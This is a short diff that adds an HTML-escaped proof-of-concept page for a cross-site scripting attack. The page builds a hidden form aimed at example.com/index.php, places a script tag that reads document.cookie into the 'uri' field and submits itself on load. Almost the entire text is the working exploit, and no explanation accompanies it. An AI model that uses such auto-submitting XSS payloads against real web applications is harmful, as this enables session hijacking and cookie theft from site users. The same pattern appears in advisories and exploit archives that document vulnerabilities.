@@ -1,0 +1,10 @@
+&lt;form action=&quot;http://www.example.com/index.php&quot; method=&quot;post&quot; name=&quot;main&quot; enctype=&quot;multipart/form-data&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;uri&quot; value=&#039;http://1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;validate_uri&quot; value=&quot;Check It&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;52428800&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;uploadfile&quot;; filename=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;gid[]&quot; value=&quot;8&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
